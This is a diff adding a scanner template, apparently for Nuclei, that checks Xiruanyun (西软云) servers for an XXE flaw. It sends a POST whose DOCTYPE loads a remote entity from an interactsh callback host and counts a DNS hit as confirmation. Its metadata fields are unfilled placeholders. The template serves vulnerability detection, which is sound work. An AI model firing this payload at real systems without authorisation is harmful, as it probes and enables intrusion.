@@ -1,0 +1,26 @@
+id: xiruanyun-getresponseasync-xxe
+
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 西软云 XML 实体注入漏洞（XXE）漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
